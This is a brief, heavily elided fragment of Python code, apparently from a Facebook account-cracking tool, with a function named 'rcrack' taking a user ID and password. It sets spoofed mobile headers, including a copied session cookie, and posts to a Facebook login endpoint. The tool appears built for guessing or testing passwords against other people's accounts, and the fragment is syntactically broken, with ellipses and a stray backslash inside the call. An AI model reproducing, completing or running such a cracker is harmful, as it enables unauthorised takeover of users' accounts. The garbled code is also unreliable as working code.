...
def rcrack(uid,pwx,tl):
  ...
  -H 'cookie: datr=YAjuZHej62mAEBHDdrVTBu6J; sb=YAjuZIo4SBn4to2O59X5bQ4a; m_pixel_ratio=2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2313%3Btimestamp%3A1693321567; vpd=v1%3B768x393x2.75; wd=393x768; fr=07Qa9XKeo6MEJEyXf.AWUcp1KtMotPbQeLE1Kgxz0Gtuw.Bk7ghg.3F.AAA.0.0.Bk7goy.AWVZx--xn1Q' \
  -H 'dpr: 2.75' \
  ...
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
            ...
            lo = session.post( 'https://p.facebook.com/?stype=lo&jlou=Ac-MFlqoTeRuyfgGOcI&wtsid=rdr_0jJKmJDNkhvxiEVhi&_rdr' \).text
